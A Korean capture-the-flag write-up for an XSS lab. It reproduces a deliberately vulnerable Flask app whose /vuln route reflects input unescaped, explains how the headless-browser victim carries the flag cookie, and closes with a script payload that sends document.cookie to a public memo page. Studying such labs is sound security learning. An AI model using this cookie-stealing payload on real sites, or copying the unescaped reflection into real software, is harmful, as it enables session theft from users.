## 코드

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시

@app.route('/memo') # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get('memo', '') # 사용가 전송한 memo 입력값을 가져옴
    memo_text += text + '\n' # 사용가 전송한 memo 입력값을 memo_text에 추가
    return render_template('memo.html', memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력 => render_template을 사용하므로

def read_url(url, cookie={"name": "name", "value": "value"}): # 다른 사용자(피해자)를 구현하기 위한 가상 시나리오
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.add_cookie({"name": "flag", "value": FLAG_FROM_FILE})
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True
    
def check_xss(param, cookie={"name": "name", "value": "value"}): # 여기까지 도달하면 취약점 성공
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
    
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # exploit 잘했는지 검증
            return '<script>alert("wrong??");history.go(-1);</script>'
        return '<script>alert("good");history.go(-1);</script>'
```

## 취약점

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 입력한 vuln 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시 ==> 그냥 그대로 return하므로 악성스크립트 실행 가능

@app.route('/memo') # memo 페이지 라우팅
def memo(): # memo 함수 선언
    global memo_text # 메모를 전역변수로 참조
    text = request.args.get('memo', '') # 사용가 전송한 memo 입력값을 가져옴
    memo_text += text + '\n' # 사용가 전송한 memo 입력값을 memo_text에 추가
    return render_template('memo.html', memo=memo_text) # 사이트에 기록된 memo_text를 화면에 출력 ==> render_template을 사용하므로 스크립트 실행 안됨
```

취약점은 vuln()에서 발생하고,
/flag 페이지에서는 127.0.0.1:8000/vuln?param='{MY_PARAM}'와 같이 취약한 함수를 실행시킬 수 있도록 해놨다.
실제로 이 string 값이 사용되는건 아니고,
/flag에 스크립트를 입력하면
-> check_xss가 실행되고 이때 입력한 MY_PARAM이 전달된다. 또한 쿠키(Flag)도 전달된다.
-> check_xss에서는 MY_PARAM을 전달받아 실제로 127.0.0.1:8000/vuln?param='{MY_PARAM}' 주소를 read_url로 전달하고
-> read_url은 127.0.0.1:8000/vuln?param='{MY_PARAM}' 주소를 실행시키는 역할을 한다.(아까 전달한 쿠키와 함께)
-> 결국 취약한 함수인 /vuln으로 MY_PARAM을 전달하는 것이다.

> 헷갈리는게 쿠키를 함수의 인자로 전달하고 있기 때문인데,
> 따지고보면 결국 피해 사용자의 쿠키를 탈취하는게 목적이므로
> 문제의 코드에서는 쿠키를 /flag에서 만들어서 줄게 아니라
> read_url이 애초에 실행될때 cookie에 flag를 담아서 갖고 있는 사용자로 만들었다면
> 헷갈리지 않을 수 있었을 것

이때 주소를 보면 127.0.0.1:8000인데, 이는 시나리오로 만든 임의의 피해 사용자의 주소이다.
결국 해당 주소의 실행은 피해 사용자가 실행하는 것이고,
따라서 alert와 같은 것은 피해자의 PC에서만 발생하므로 우리는 볼 수 없다.
공격자인 우리가 이 쿠키 값을 얻기 위해서는 쿠키를 출력할 수 있어야 하는데,
이때 memo는 스크립트를 실행시키진 않지만 string을 그대로 출력하는 기능이 있다.
심지어 모든 유저가 이 memo에 접근할 수 있으므로,
127.0.0.1:8000 사용자가 실행한 memo 명령도 모두가 볼 수 있다.
따라서 MY_PARAM에 들어갈 alert(document.cookie) 스크립트는
location.href = "/memo?memo=" + document.cookie 스크립트이다.
이를 넣으면 127.0.0.1:8000/vuln은 "/memo?memo=" + document.cookie를 실행시킬 것이며,
127.0.0.1:8000의 document.cookie인 FLAG가 나타나는 것이다.

## 풀이 스크립트

<script>location.href = "/memo?memo=" + document.cookie;</script>